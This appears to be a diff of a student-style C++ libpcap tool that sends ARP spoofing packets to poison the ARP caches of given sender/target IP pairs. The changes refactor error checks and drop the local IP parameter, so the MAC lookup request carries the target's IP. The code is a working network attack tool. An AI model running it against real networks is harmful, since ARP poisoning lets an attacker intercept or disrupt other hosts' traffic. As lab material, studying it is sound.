@@ -23,7 +23,7 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-void getMyMacAddr(const char* interfaceName, Mac& myMac, Ip& myIp) {
+void getMyMacAddr(const char* interfaceName, Mac& myMac) {
     struct ifaddrs *ifaddr = NULL;
     struct ifaddrs *ifa = NULL;
 
@@ -35,11 +35,10 @@ void getMyMacAddr(const char* interfaceName, Mac& myMac, Ip& myIp) {
         for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
             if ((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET) && !strcmp(ifa->ifa_name, interfaceName)) {
 				struct sockaddr_in *sa = (struct sockaddr_in *) ifa->ifa_addr;
-				myIp = Ip(inet_ntoa(sa->sin_addr));
             	
                 ostringstream oss;
                 struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
-                for (int i = 0; i < (s->sll_halen); i++) {
+                for (int i = 0; i < s->sll_halen; i++) {
                     oss << hex << setfill('0') << setw(2) << static_cast<int>(s->sll_addr[i]);
                     if (i != s->sll_halen - 1) oss << ":";
                 }
@@ -70,7 +69,7 @@ void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const
 
 	// * 2. get MAC address from ARP reply
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res) {
+	if (res!= 0) {
         fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
 		exit(EXIT_FAILURE);
         return;
@@ -82,9 +81,9 @@ void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const
         const u_char* replyPacket;
 
         res = pcap_next_ex(handle, &header, &replyPacket);
-        if (!res) continue;
-
-		if (res < 0) {
+        if (res == 0) {
+            continue; // Timeout, no packet captured, continue listening
+        } else if (res < 0) {
             fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
             exit(EXIT_FAILURE);
         }
@@ -107,11 +106,11 @@ void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const
     fprintf(stderr, "Failed to get ARP reply\n");
 }
 
-void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char* targetIpStr, Mac myMac, Ip myIp) {
+void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char* targetIpStr, Mac myMac) {
 	Mac senderMac;
 	Ip senderIp = Ip(senderIpStr);
 	Ip targetIp = Ip(targetIpStr);
-	getMacAddrFromSendArp(handle, myIp, myMac, senderIp, senderMac);
+	getMacAddrFromSendArp(handle, targetIp, myMac, senderIp, senderMac);
 	
 	EthArpPacket packet;
 
@@ -130,7 +129,7 @@ void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char*
 	packet.arp_.tip_ = htonl(senderIp);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res) {
+	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		exit(EXIT_FAILURE);
 	}
@@ -152,7 +151,7 @@ int main(int argc, char* argv[]) {
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	if (!handle) {
+	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
@@ -160,16 +159,15 @@ int main(int argc, char* argv[]) {
 	vector<pair<char*, char*>> sender_target_pairs;
 	for (int i = 2; i < argc; i += 2) sender_target_pairs.push_back({argv[i], argv[i + 1]});
 
-	Ip myIp;
 	Mac myMac;
-	getMyMacAddr(dev, myMac, myIp);
+	getMyMacAddr(dev, myMac);
 
 	set<string> senderSet = set<string>();
 
 	for (const pair<char*, char*>& pair : sender_target_pairs) {
 		if(senderSet.find(pair.first) != senderSet.end()) continue;
 		
-		send_arp_attack_packet(handle, pair.first, pair.second, myMac, myIp);
+		send_arp_attack_packet(handle, pair.first, pair.second, myMac);
 		senderSet.insert(pair.first);
 
 		printf("Send <%s, %s>\n", pair.first, pair.second);
